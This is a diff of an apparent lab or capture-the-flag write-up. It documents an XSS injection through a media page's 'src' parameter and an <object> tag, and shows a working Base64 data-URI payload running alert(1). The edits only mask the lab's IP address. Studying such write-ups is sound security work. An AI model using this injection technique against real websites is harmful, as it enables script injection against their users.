@@ -2,7 +2,7 @@
 # XSS injection media page
 ## Reconnaissance
 On the website home page, only one image is clickable.
-Clicking on it leads us to the following link: `http://172.16.0.98/?page=media&src=nsa`
+Clicking on it leads us to the following link: `http://x.x.x.x/?page=media&src=nsa`
 
 Upon inspecting the page, we discover an `<object>` HTML tag, which is known for its potential vulnerability to XSS injection.
 
@@ -10,7 +10,7 @@ Upon inspecting the page, we discover an `<object>` HTML tag, which is known for
 By manipulating the `src` parameter in the URL, we attempt to launch an attack.
 
 The following URL does not work and returns an error:
-`http://172.16.0.98/?page=media&src=<script>alert(1)</script>`
+`http://x.x.x.x/?page=media&src=<script>alert(1)</script>`
 
 This is likely because the URL does not support special characters like `/`.
 
@@ -18,11 +18,11 @@ To overcome this, we attempt to encode the URL in Base64:
 - `<script>alert(1)</script>` -> `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
 
 The modified URL does not work either:
-`http://172.16.0.98/?page=media&src=bW9kdWxlPSJtZWRpYSZzcmM9PGJvZHk%2BYWxlcnQoMSk8L2JvZHk%2B`
+`http://x.x.x.x/?page=media&src=bW9kdWxlPSJtZWRpYSZzcmM9PGJvZHk%2BYWxlcnQoMSk8L2JvZHk%2B`
 
 
 To proceed, we add the following part to the URL to indicate that the subsequent content is encoded in Base64: `data:text/html;base64`
-This gives us the working URL:: `http://172.16.0.98/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
+This gives us the working URL:: `http://x.x.x.x/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`
 
 
 **Flag:**
